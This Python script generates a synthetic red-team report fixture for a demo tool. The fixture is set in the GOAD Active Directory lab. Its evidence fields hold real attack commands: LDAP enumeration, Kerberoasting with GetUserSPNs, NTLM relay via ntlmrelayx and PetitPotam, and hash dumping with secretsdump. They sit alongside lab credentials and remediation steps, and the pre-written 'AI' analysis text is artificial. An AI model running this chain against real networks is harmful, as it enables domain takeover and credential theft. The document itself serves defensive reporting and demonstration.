"""GOAD-style synthetic engagement generator.

Generates a realistic Active Directory attack engagement and saves it to
demo/fixtures/goad_sample.json. The fixture includes pre-written AI details
so the demo works without an API key.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

# The canonical GOAD sample is checked into the repo — this generator can
# regenerate it or create variations.

GOAD_FIXTURE = {
    "engagement_id": "goad-2024-demo-001",
    "target_name": "GOAD Lab — Active Directory Attack Simulation",
    "metadata": {
        "operator": "ACM Demo",
        "assessment_type": "Red Team",
        "environment": "GOAD v2 (Game of Active Directory)",
        "start_time": "2024-03-15T09:00:00Z",
        "end_time": "2024-03-15T11:34:00Z",
    },
    "findings": [
        {
            "id": "f-recon",
            "title": "Host and port discovery",
            "severity": 0.0,
            "severity_label": "INFO",
            "mitre_technique": "T1046",
            "step_index": 1,
            "timestamp_offset_s": 0,
            "enabled_by": [],
            "evidence": (
                "nmap -sV -p- 192.168.56.0/24\n"
                "Host: 192.168.56.10 (DC01.sevenkingdoms.local)\n"
                "  88/tcp  open  kerberos-sec\n"
                "  389/tcp open  ldap\n"
                "  445/tcp open  microsoft-ds\n"
                "  636/tcp open  ldaps\n"
                "Host: 192.168.56.11 (CASTELBLACK.north.sevenkingdoms.local)\n"
                "Host: 192.168.56.22 (BRAAVOS.essos.local)"
            ),
            "host": "192.168.56.0/24",
            "ai_detail": (
                "Comprehensive network sweep of the /24 subnet revealed three AD-joined hosts. "
                "DC01 exposes all critical AD services including LDAP (389/636), Kerberos (88), "
                "and SMB (445) without network-layer filtering. This service exposure provides "
                "the roadmap for subsequent attack phases."
            ),
            "ai_remediation": (
                "1. Implement network segmentation: place DCs behind a dedicated VLAN.\n"
                "2. Restrict LDAP/SMB access to authorised management hosts only.\n"
                "3. Deploy intrusion detection on DC-facing network segments."
            ),
            "ai_confidence": 1.0,
        },
        {
            "id": "f-ldap",
            "title": "Anonymous LDAP bind allows full directory enumeration",
            "severity": 3.1,
            "severity_label": "LOW",
            "mitre_technique": "T1087.002",
            "step_index": 3,
            "timestamp_offset_s": 720,
            "enabled_by": ["f-recon"],
            "evidence": (
                "ldapsearch -H ldap://192.168.56.10 -x -b 'DC=sevenkingdoms,DC=local'\n"
                "Returned 847 objects: all users, computers, groups, SPNs\n"
                "SPNs found: svc_backup/DC01, MSSQLSvc/CASTELBLACK\n"
                "Password policy: minPwdLength=7, lockoutThreshold=0"
            ),
            "host": "192.168.56.10 (DC01)",
            "ai_detail": (
                "Anonymous LDAP binds exposed the entire directory to unauthenticated enumeration. "
                "The operator retrieved all 847 directory objects including SPNs for svc_backup "
                "and MSSQLSvc (kerberoastable targets) and confirmed a weak password policy with "
                "no account lockout. This single misconfiguration enabled every subsequent attack."
            ),
            "ai_remediation": (
                "1. Disable anonymous LDAP binds via dsHeuristics attribute.\n"
                "2. Require LDAP signing (GPO: Domain controller LDAP server signing = Required).\n"
                "3. Enforce minimum password length of 15+ characters with lockout policy."
            ),
            "ai_confidence": 0.98,
        },
        {
            "id": "f-sysvol",
            "title": "Cleartext credentials in SYSVOL GPP XML files",
            "severity": 6.5,
            "severity_label": "MEDIUM",
            "mitre_technique": "T1552.006",
            "step_index": 6,
            "timestamp_offset_s": 3300,
            "enabled_by": ["f-ldap"],
            "evidence": (
                "Found: /sevenkingdoms.local/Policies/{A6B69...}/Machine/Preferences/Groups/Groups.xml\n"
                "cpassword decrypted: Winter_Is_Coming_2019!\n"
                "Account: sevenkingdoms\\Administrator (local admin on CASTELBLACK)"
            ),
            "host": "DC01 SYSVOL share",
            "ai_detail": (
                "GPP cpassword (MS14-025) found in SYSVOL. The static Microsoft AES key decrypts "
                "the credential trivially. 'Winter_Is_Coming_2019!' grants local admin on CASTELBLACK "
                "and enabled the NTLM relay coercion step."
            ),
            "ai_remediation": (
                "1. Remove all cpassword entries from SYSVOL immediately.\n"
                "2. Reset all exposed accounts.\n"
                "3. Deploy LAPS for local admin password management.\n"
                "4. Audit SYSVOL quarterly for credential-containing files."
            ),
            "ai_confidence": 0.99,
        },
        {
            "id": "f-smb",
            "title": "SMB signing disabled on DC01 enables relay attacks",
            "severity": 6.8,
            "severity_label": "MEDIUM",
            "mitre_technique": "T1557",
            "step_index": 9,
            "timestamp_offset_s": 6480,
            "enabled_by": ["f-ldap"],
            "evidence": (
                "crackmapexec smb 192.168.56.0/24 --gen-relay-list relay_targets.txt\n"
                "192.168.56.10  DC01  signing:False  SMBv1:False\n"
                "192.168.56.11  CASTELBLACK  signing:False\n"
                "All hosts vulnerable to NTLM relay."
            ),
            "host": "192.168.56.10, 192.168.56.11, 192.168.56.22",
            "ai_detail": (
                "SMB signing disabled on all three hosts including the primary DC. "
                "Without packet signing, intercepted NTLM authentication can be replayed "
                "to any target. Combined with the SYSVOL credential (f-sysvol) for coercion, "
                "this creates a direct path to DC compromise."
            ),
            "ai_remediation": (
                "1. Enable SMB signing on all DCs: Set-SmbServerConfiguration -RequireSecuritySignature $true.\n"
                "2. Enforce via GPO: Microsoft network server: Digitally sign communications = Required.\n"
                "3. Enable Protected Users group for all privileged accounts."
            ),
            "ai_confidence": 0.97,
        },
        {
            "id": "f-ntlm-relay",
            "title": "Domain admin compromise via NTLM relay to DC01 LDAP",
            "severity": 9.8,
            "severity_label": "CRITICAL",
            "mitre_technique": "T1557.001",
            "step_index": 14,
            "timestamp_offset_s": 9240,
            "enabled_by": ["f-smb", "f-sysvol"],
            "evidence": (
                "ntlmrelayx.py -t ldap://192.168.56.10 --escalate-user jon.snow --delegate-access\n"
                "petitpotam.py -u Administrator -p 'Winter_Is_Coming_2019!' DC01 CASTELBLACK\n"
                "[*] Escalated jon.snow to Domain Admins\n"
                "secretsdump: Administrator hash dumped. krbtgt hash dumped."
            ),
            "host": "192.168.56.10 (DC01)",
            "ai_detail": (
                "Full domain compromise via NTLM relay. PetitPotam coerced DC01$ authentication "
                "using the SYSVOL credential; ntlmrelayx relayed to DC LDAP and granted the "
                "operator's account Domain Admin + RBCD. DCSync then dumped all hashes including "
                "krbtgt — enabling persistent Golden Ticket access. Total time from entry to DA: 2h34m."
            ),
            "ai_remediation": (
                "1. IMMEDIATE: Reset krbtgt password twice (10-hour gap) per Microsoft guidance.\n"
                "2. Remove jon.snow from Domain Admins; revoke all RBCD grants.\n"
                "3. Enable LDAP signing + channel binding on all DCs.\n"
                "4. Block EFS RPC coercion via firewall or patch.\n"
                "5. Deploy Defender for Identity with NTLM relay detection enabled.\n"
                "6. Implement AD tiering model with Privileged Access Workstations."
            ),
            "ai_confidence": 1.0,
        },
        {
            "id": "f-kerberoast",
            "title": "Kerberoastable svc_backup service account",
            "severity": 7.2,
            "severity_label": "HIGH",
            "mitre_technique": "T1558.003",
            "step_index": 11,
            "timestamp_offset_s": 7800,
            "enabled_by": ["f-ldap"],
            "evidence": (
                "GetUserSPNs.py sevenkingdoms.local/ -dc-ip 192.168.56.10 -no-pass\n"
                "SPN: svc_backup/DC01.sevenkingdoms.local | MemberOf: Backup Operators\n"
                "PasswordLastSet: 2019-11-15\n"
                "Cracked: svc_backup:Backup2019! (3 minutes, rockyou.txt)"
            ),
            "host": "DC01 — svc_backup account",
            "ai_detail": (
                "Anonymous LDAP exposed the svc_backup SPN. The TGS ticket was captured offline "
                "and cracked in 3 minutes. Backup Operators membership grants arbitrary file read "
                "on DCs including NTDS.dit — an alternative DA path independent of the relay chain."
            ),
            "ai_remediation": (
                "1. Reset svc_backup to a 30+ character random password immediately.\n"
                "2. Convert to a Group Managed Service Account (gMSA) with auto-rotating passwords.\n"
                "3. Remove from Backup Operators; use least-privilege backup agent instead.\n"
                "4. Enable AES-256 encryption for all service accounts to prevent RC4 downgrade.\n"
                "5. Deploy honeypot SPNs to detect Kerberoasting attempts."
            ),
            "ai_confidence": 0.95,
        },
    ],
}


def generate_and_save(output_path: Path | None = None) -> Path:
    """Generate the GOAD fixture and save to file."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / "demo" / "fixtures" / "goad_sample.json"

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(GOAD_FIXTURE, indent=2), encoding="utf-8")
    return output_path


if __name__ == "__main__":
    out = generate_and_save()
    print(f"Generated: {out}")
